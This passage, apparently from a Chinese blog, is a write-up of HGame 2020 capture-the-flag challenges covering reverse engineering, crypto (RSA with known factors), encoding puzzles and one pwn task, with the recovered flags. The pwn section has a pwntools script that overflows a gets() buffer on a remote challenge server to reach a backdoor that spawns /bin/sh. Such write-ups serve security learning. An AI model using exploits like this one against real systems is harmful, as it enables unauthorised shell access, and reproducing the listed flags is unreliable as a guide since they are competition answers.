class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">sub_140002AE0</span>((__int64)&amp;v13);                 <span class="hljs-comment">// 大概是string类的构造函数</span></span><br><span class="line"> <span class="hljs-built_in">sub_1400018D0</span>(std::cin, &amp;v13);                <span class="hljs-comment">// cin&gt;&gt;v13</span></span><br><span class="line"> v15 = <span class="hljs-string">"hgame{"</span>;</span><br><span class="line"> <span class="hljs-built_in">sub_140002B30</span>((__int64)&amp;v14);</span><br><span class="line"> <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">find_sub</span>(&amp;v13, v15, <span class="hljs-number">0</span>i64) || <span class="hljs-built_in">find_sub</span>(&amp;v13, <span class="hljs-string">"}"</span>, <span class="hljs-number">0</span>i64) != <span class="hljs-number">61</span> )<span class="hljs-comment">// 猜测输入字符串长度位62，格式位hgame{***}</span></span><br><span class="line"> {</span><br><span class="line">   v5 = <span class="hljs-built_in">sub_140001900</span>(std::cout, <span class="hljs-string">"error"</span>);</span><br><span class="line">   std::basic_ostream&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>&lt;&lt;(v5, sub_140002830);</span><br><span class="line">   <span class="hljs-built_in">sub_140003010</span>(&amp;v14);</span><br><span class="line">   <span class="hljs-built_in">sub_140002FA0</span>(&amp;v13);</span><br><span class="line">   result = <span class="hljs-number">0</span>i64;</span><br><span class="line"> }</span><br><span class="line"> <span class="hljs-keyword">else</span></span><br><span class="line"> {</span><br><span class="line">   <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">6</span>i64; ; i = v11 + <span class="hljs-number">1</span> )             <span class="hljs-comment">// 一波操作完全看不懂，猜测是根据'_'来分割字符串，分割成9个数</span></span><br><span class="line">   {</span><br><span class="line">     <span class="hljs-built_in">LOBYTE</span>(v0) = <span class="hljs-string">'_'</span>;</span><br><span class="line">     v11 = <span class="hljs-built_in">find</span>(&amp;v13, v0, i);</span><br><span class="line">     <span class="hljs-keyword">if</span> ( v11 == <span class="hljs-number">-1</span> )</span><br><span class="line">       <span class="hljs-keyword">break</span>;</span><br><span class="line">     v16 = <span class="hljs-built_in">sub_1400043B0</span>(&amp;v13, &amp;v40, i, v11 - i);</span><br><span class="line">     v17 = v16;</span><br><span class="line">     v1 = <span class="hljs-built_in">sub_140003E80</span>(v16);</span><br><span class="line">     v18 = <span class="hljs-built_in">atoll</span>(v1);</span><br><span class="line">     <span class="hljs-built_in">sub_140004350</span>(&amp;v14, &amp;v18);</span><br><span class="line">     <span class="hljs-built_in">sub_140002FA0</span>(&amp;v40);</span><br><span class="line">   }</span><br><span class="line">   v19 = <span class="hljs-built_in">sub_1400043B0</span>(&amp;v13, &amp;v41, i, <span class="hljs-number">61</span> - i);</span><br><span class="line">   v20 = v19;</span><br><span class="line">   v2 = <span class="hljs-built_in">sub_140003E80</span>(v19);</span><br><span class="line">   v21 = <span class="hljs-built_in">atoll</span>(v2);                            <span class="hljs-comment">// 直接把字符串转换成长整型，说明字符串里就是以'_'连接的数字</span></span><br><span class="line">   <span class="hljs-built_in">sub_140004350</span>(&amp;v14, &amp;v21);</span><br><span class="line">   <span class="hljs-built_in">sub_140002FA0</span>(&amp;v41);</span><br><span class="line">   v31 = <span class="hljs-number">26727</span>i64;                             <span class="hljs-comment">// 根据下面的运算这里应该是两个矩阵</span></span><br><span class="line">   v32 = <span class="hljs-number">24941</span>i64;</span><br><span class="line">   v33 = <span class="hljs-number">101</span>i64;</span><br><span class="line">   v34 = <span class="hljs-number">29285</span>i64;</span><br><span class="line">   v35 = <span class="hljs-number">26995</span>i64;</span><br><span class="line">   v36 = <span class="hljs-number">29551</span>i64;</span><br><span class="line">   v37 = <span class="hljs-number">29551</span>i64;</span><br><span class="line">   v38 = <span class="hljs-number">25953</span>i64;</span><br><span class="line">   v39 = <span class="hljs-number">29561</span>i64;</span><br><span class="line">   v22 = <span class="hljs-number">1</span>i64;</span><br><span class="line">   v23 = <span class="hljs-number">0</span>i64;</span><br><span class="line">   v24 = <span class="hljs-number">1</span>i64;</span><br><span class="line">   v25 = <span class="hljs-number">0</span>i64;</span><br><span class="line">   v26 = <span class="hljs-number">1</span>i64;</span><br><span class="line">   v27 = <span class="hljs-number">1</span>i64;</span><br><span class="line">   v28 = <span class="hljs-number">1</span>i64;</span><br><span class="line">   v29 = <span class="hljs-number">2</span>i64;</span><br><span class="line">   v30 = <span class="hljs-number">2</span>i64;</span><br><span class="line">   <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>i64; j &lt; <span class="hljs-number">3</span>; ++j )                <span class="hljs-comment">// 三个for循环时矩阵运算，如果满足条件就直接输出正确</span></span><br><span class="line">   {</span><br><span class="line">     <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>i64; k &lt; <span class="hljs-number">3</span>; ++k )</span><br><span class="line">     {</span><br><span class="line">       v12 = <span class="hljs-number">0</span>i64;</span><br><span class="line">       <span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt; <span class="hljs-number">3</span>; ++l )</span><br><span class="line">         v12 += *(&amp;v22 + <span class="hljs-number">3</span> * l + k) * *(_QWORD *)<span class="hljs-built_in">sub_1400031E0</span>(&amp;v14, l + <span class="hljs-number">3</span> * j);</span><br><span class="line">       <span class="hljs-keyword">if</span> ( *(&amp;v31 + <span class="hljs-number">3</span> * j + k) != v12 )</span><br><span class="line">       {</span><br><span class="line">         v3 = <span class="hljs-built_in">sub_140001900</span>(std::cout, <span class="hljs-string">"error"</span>);</span><br><span class="line">         std::basic_ostream&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>&lt;&lt;(v3, sub_140002830);</span><br><span class="line">         <span class="hljs-built_in">sub_140003010</span>(&amp;v14);</span><br><span class="line">         <span class="hljs-built_in">sub_140002FA0</span>(&amp;v13);</span><br><span class="line">         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;</span><br><span class="line">       }</span><br><span class="line">     }</span><br><span class="line">   }</span><br><span class="line">   v6 = <span class="hljs-built_in">sub_140001900</span>(std::cout, <span class="hljs-string">"you are good at re"</span>);</span><br><span class="line">   std::basic_ostream&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-keyword">operator</span>&lt;&lt;(v6, sub_140002830);</span><br></pre></td></tr></tbody></table></figure>

<p>最主要的部分（假装）分析一遍，发现只需要矩阵求逆和矩阵乘法，就可以得到flag</p>
<p>尝试一下</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.array([[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>]])</span><br><span class="line">b = np.linalg.inv(a)</span><br><span class="line"><span class="hljs-comment"># print(b)</span></span><br><span class="line"><span class="hljs-comment"># print(np.dot(a,b))</span></span><br><span class="line">c = np.array([[<span class="hljs-number">26727</span>, <span class="hljs-number">24941</span>, <span class="hljs-number">101</span>], [<span class="hljs-number">29285</span>, <span class="hljs-number">26995</span>, <span class="hljs-number">29551</span>], [<span class="hljs-number">29551</span>, <span class="hljs-number">25953</span>, <span class="hljs-number">29561</span>]])</span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line">d = np.dot(c, b)</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):</span><br><span class="line">        flag += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(d.item(i, j))) + <span class="hljs-string">'_'</span></span><br><span class="line">flag = <span class="hljs-string">'hgame{'</span> + flag[:-<span class="hljs-number">1</span>] + <span class="hljs-string">'}'</span></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure>

<p>提交提示成功，猜测正确</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943}</span><br></pre></td></tr></tbody></table></figure>



<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h4><p>IDA反编译</p>
<figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+0h] [ebp-ACh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+7Bh] [ebp-31h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+A0h] [ebp-Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> *v7; <span class="hljs-comment">// [esp+A4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="hljs-number">0x14</span>u);</span><br><span class="line">  <span class="hljs-built_in">alarm</span>(<span class="hljs-number">8u</span>);</span><br><span class="line">  <span class="hljs-built_in">setbuf</span>(_bss_start, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0xA0</span>u);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Let's 0O0o\\0O0!"</span>);</span><br><span class="line">  <span class="hljs-built_in">gets</span>(&amp;s);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(<span class="hljs-string">"0O0o"</span>, &amp;v5, <span class="hljs-number">7u</span>) )</span><br><span class="line">    <span class="hljs-built_in">backdoor</span>();</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//backdoor</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">backdoor</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">system</span>(<span class="hljs-string">"/bin/sh"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>所以最终的目标是运行backdoor()，所以只需要进入if分支就可以了，即v5和前面的字符串相等，自然想到输入s覆盖v5的值，不过需要注意的是，memcmp函数比较了7位，所以还要找到后面的几个字节，形成payload</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">io = remote(<span class="hljs-string">"47.103.214.163"</span>,<span class="hljs-string">"20000"</span>)</span><br><span class="line"><span class="hljs-comment">#io=process("./Hard_AAAAA")</span></span><br><span class="line">io.recvuntil(<span class="hljs-string">"Let's 0O0o\\0O0!"</span>)</span><br><span class="line">payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">123</span>+<span class="hljs-string">'0O0o\0O0'</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>最终得到flag：</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{0OoO0oo0O0Oo}</span><br></pre></td></tr></tbody></table></figure>



<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h4><p>简单的RSA解密，p和q都已经分解出来了，其它的没什么难度</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gcdext</span>(<span class="hljs-params">a, b</span>):</span></span><br><span class="line">    <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">    a: 模的取值</span></span><br><span class="line"><span class="hljs-string">    b: 想求逆的值</span></span><br><span class="line"><span class="hljs-string">    """</span></span><br><span class="line">    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, a</span><br><span class="line">    x, y, gcd = gcdext(b, a % b)</span><br><span class="line">    <span class="hljs-keyword">return</span> y, x - a // b * y, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="hljs-number">275698465082361070145173688411496311542172902608559859019841</span></span><br><span class="line">p = <span class="hljs-number">681782737450022065655472455411</span></span><br><span class="line">q = <span class="hljs-number">675274897132088253519831953441</span></span><br><span class="line">e = <span class="hljs-number">13</span></span><br><span class="line">n = p * q</span><br><span class="line"><span class="hljs-comment"># print(k)</span></span><br><span class="line">fai = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)</span><br><span class="line">(d, k, g) = gcdext(e, fai)</span><br><span class="line"><span class="hljs-comment"># print(fai)</span></span><br><span class="line"><span class="hljs-comment"># print(k)</span></span><br><span class="line"><span class="hljs-comment"># print(m)</span></span><br><span class="line">m = <span class="hljs-built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="hljs-comment"># print(m)</span></span><br><span class="line">f = m.to_bytes(<span class="hljs-number">22</span>, byteorder=<span class="hljs-string">'big'</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(f)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>直接求解出来flag</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{t3Xt6O0k_R5A!!!}</span><br></pre></td></tr></tbody></table></figure>



<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h4><p>首先看到一长串似曾相识的东西</p>
<figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</span><br></pre></td></tr></tbody></table></figure>

<p>像是摩斯电码base64加密之后的东西</p>
<p>所以base64解码之后</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</span><br></pre></td></tr></tbody></table></figure>

<p>果然是摩斯电码，然后解摩斯电码</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">CODE = {<span class="hljs-string">'A'</span>: <span class="hljs-string">'.-'</span>, <span class="hljs-string">'B'</span>: <span class="hljs-string">'-...'</span>, <span class="hljs-string">'C'</span>: <span class="hljs-string">'-.-.'</span>,</span><br><span class="line">        <span class="hljs-string">'D'</span>: <span class="hljs-string">'-..'</span>, <span class="hljs-string">'E'</span>: <span class="hljs-string">'.'</span>, <span class="hljs-string">'F'</span>: <span class="hljs-string">'..-.'</span>,</span><br><span class="line">        <span class="hljs-string">'G'</span>: <span class="hljs-string">'--.'</span>, <span class="hljs-string">'H'</span>: <span class="hljs-string">'....'</span>, <span class="hljs-string">'I'</span>: <span class="hljs-string">'..'</span>,</span><br><span class="line">        <span class="hljs-string">'J'</span>: <span class="hljs-string">'.---'</span>, <span class="hljs-string">'K'</span>: <span class="hljs-string">'-.-'</span>, <span class="hljs-string">'L'</span>: <span class="hljs-string">'.-..'</span>,</span><br><span class="line">        <span class="hljs-string">'M'</span>: <span class="hljs-string">'--'</span>, <span class="hljs-string">'N'</span>: <span class="hljs-string">'-.'</span>, <span class="hljs-string">'O'</span>: <span class="hljs-string">'---'</span>,</span><br><span class="line">        <span class="hljs-string">'P'</span>: <span class="hljs-string">'.--.'</span>, <span class="hljs-string">'Q'</span>: <span class="hljs-string">'--.-'</span>, <span class="hljs-string">'R'</span>: <span class="hljs-string">'.-.'</span>,</span><br><span class="line">        <span class="hljs-string">'S'</span>: <span class="hljs-string">'...'</span>, <span class="hljs-string">'T'</span>: <span class="hljs-string">'-'</span>, <span class="hljs-string">'U'</span>: <span class="hljs-string">'..-'</span>,</span><br><span class="line">        <span class="hljs-string">'V'</span>: <span class="hljs-string">'...-'</span>, <span class="hljs-string">'W'</span>: <span class="hljs-string">'.--'</span>, <span class="hljs-string">'X'</span>: <span class="hljs-string">'-..-'</span>,</span><br><span class="line">        <span class="hljs-string">'Y'</span>: <span class="hljs-string">'-.--'</span>, <span class="hljs-string">'Z'</span>: <span class="hljs-string">'--..'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-string">'0'</span>: <span class="hljs-string">'-----'</span>, <span class="hljs-string">'1'</span>: <span class="hljs-string">'.----'</span>, <span class="hljs-string">'2'</span>: <span class="hljs-string">'..---'</span>,</span><br><span class="line">        <span class="hljs-string">'3'</span>: <span class="hljs-string">'...--'</span>, <span class="hljs-string">'4'</span>: <span class="hljs-string">'....-'</span>, <span class="hljs-string">'5'</span>: <span class="hljs-string">'.....'</span>,</span><br><span class="line">        <span class="hljs-string">'6'</span>: <span class="hljs-string">'-....'</span>, <span class="hljs-string">'7'</span>: <span class="hljs-string">'--...'</span>, <span class="hljs-string">'8'</span>: <span class="hljs-string">'---..'</span>,</span><br><span class="line">        <span class="hljs-string">'9'</span>: <span class="hljs-string">'----.'</span>,</span><br><span class="line"></span><br><span class="line">        <span class="hljs-string">'.'</span>: <span class="hljs-string">'.-.-.-'</span>, <span class="hljs-string">':'</span>: <span class="hljs-string">'---...'</span>, <span class="hljs-string">','</span>: <span class="hljs-string">'--..--'</span>, <span class="hljs-string">';'</span>: <span class="hljs-string">'-.-.-.'</span>,</span><br><span class="line">        <span class="hljs-string">'?'</span>: <span class="hljs-string">'..--..'</span>, <span class="hljs-string">'='</span>: <span class="hljs-string">'-...-'</span>, <span class="hljs-string">'\''</span>: <span class="hljs-string">'.----.'</span>, <span class="hljs-string">'/'</span>: <span class="hljs-string">'-..-.'</span>,</span><br><span class="line">        <span class="hljs-string">'!'</span>: <span class="hljs-string">'-.-.--'</span>, <span class="hljs-string">'-'</span>: <span class="hljs-string">'-....-'</span>, <span class="hljs-string">'_'</span>: <span class="hljs-string">'..--.-'</span>, <span class="hljs-string">'"'</span>: <span class="hljs-string">'.-..-.'</span>,</span><br><span class="line">        <span class="hljs-string">'('</span>: <span class="hljs-string">'-.--.'</span>, <span class="hljs-string">')'</span>: <span class="hljs-string">'-.--.-'</span>, <span class="hljs-string">'$'</span>: <span class="hljs-string">'...-..-'</span>, <span class="hljs-string">'&amp;'</span>: <span class="hljs-string">'.-...'</span>,</span><br><span class="line">        <span class="hljs-string">'@'</span>: <span class="hljs-string">'.--.-.'</span></span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Decode</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span></span><br><span class="line">    Decode_value = CODE.keys()</span><br><span class="line">    Decode_key = CODE.values()</span><br><span class="line">    Decode_dict = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(Decode_key, Decode_value))</span><br><span class="line"></span><br><span class="line">    text = <span class="hljs-string">''</span></span><br><span class="line">    msg = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">' '</span>)</span><br><span class="line">    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> msg:</span><br><span class="line">        <span class="hljs-keyword">if</span> s <span class="hljs-keyword">in</span> Decode_dict.keys():</span><br><span class="line">            text += Decode_dict[s]</span><br><span class="line">    <span class="hljs-keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(Decode(<span class="hljs-string">'.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--'</span>))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>这里还有符号的摩斯电码，大部分的在线解码都没有，所以自己写了一个，解码出来补上hgame：</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{W3LC0ME_TO_2020_HGAM3}</span><br></pre></td></tr></tbody></table></figure>

<h4 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h4><p>下载解压，是张图片，自然想到隐写，binwalk跑出来，发现是个压缩包，打开压缩包，发现需要密码，密码是这张照片在P站的ID，P站未知原因打不开，上B站找到了ID：76953815</p>
<p>解压出来打开flag.txt，内容如下：</p>
<figure class="highlight taggerscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">\u</span>68<span class="hljs-symbol">\u</span>67<span class="hljs-symbol">\u</span>61<span class="hljs-symbol">\u</span>6d<span class="hljs-symbol">\u</span>65<span class="hljs-symbol">\u</span>7b<span class="hljs-symbol">\u</span>44<span class="hljs-symbol">\u</span>6f<span class="hljs-symbol">\u</span>5f<span class="hljs-symbol">\u</span>79<span class="hljs-symbol">\u</span>30<span class="hljs-symbol">\u</span>75<span class="hljs-symbol">\u</span>5f<span class="hljs-symbol">\u</span>4b<span class="hljs-symbol">\u</span>6e<span class="hljs-symbol">\u</span>4f<span class="hljs-symbol">\u</span>57<span class="hljs-symbol">\u</span>5f<span class="hljs-symbol">\u</span>75<span class="hljs-symbol">\u</span>4e<span class="hljs-symbol">\u</span>69<span class="hljs-symbol">\u</span>43<span class="hljs-symbol">\u</span>30<span class="hljs-symbol">\u</span>64<span class="hljs-symbol">\u</span>33<span class="hljs-symbol">\u</span>3f<span class="hljs-symbol">\u</span>7d</span><br></pre></td></tr></tbody></table></figure>

<p>unicode编码，解码得：</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{Do_y0u_KnOW_uNiC0d3?}</span><br></pre></td></tr></tbody></table></figure>

<h4 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h4><p>压缩包打开，有一个密码提示和一个新的压缩包，Password.txt得内容如下：</p>
<figure class="highlight vim hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rdjxfwxjfimkn <span class="hljs-keyword">z</span>,<span class="hljs-keyword">ts</span> wntzi xtjrwm xsfjt jm ywt rtntwhf <span class="hljs-keyword">f</span> <span class="hljs-keyword">y</span>   h jnsxf qjFjf jnb  rg fiyykwtbsnkm <span class="hljs-keyword">tm</span>  <span class="hljs-keyword">xa</span> jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.</span><br><span class="line"></span><br><span class="line">JRFVJYFZVRUAGMAI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* Three fences <span class="hljs-keyword">first</span>, Five Caesar <span class="hljs-keyword">next</span>. English sentense <span class="hljs-keyword">first</span>,  zip password <span class="hljs-keyword">next</span>.</span><br></pre></td></tr></tbody></table></figure>

<p>根据提示，把上面的内容用3个字符得栅栏密码和5个字符得凯撒密码解密，得到一段英文和压缩包的密码</p>
<figure class="highlight livescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Many years later <span class="hljs-keyword">as</span> he faced the firing squad, Colonel Aureliano Buendia was <span class="hljs-keyword">to</span> remember <span class="hljs-literal">that</span> distant afternoon <span class="hljs-keyword">when</span> his father took him <span class="hljs-keyword">to</span> discover ice.</span><br><span class="line"></span><br><span class="line">EAVMUBAQHQMVEPDT</span><br></pre></td></tr></tbody></table></figure>

<p>解压出来得到一个新的txt文件，里面是莫名其妙的Ook语言,用在线工具翻译为text，得到一段base32编码大的字符串，base32解密之后得到了又一串编码过的字符，试一试base64，发现解码出来的内容有很多乱码，不过是PNG开头，应该是base64转图片，写个python脚本解码，得到一个二维码，扫码得到flag</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{3Nc0dInG_@lL_iN_0Ne!}</span><br></pre></td></tr></tbody></table></figure>

<p>这题有各种各样的编码，还不错</p>
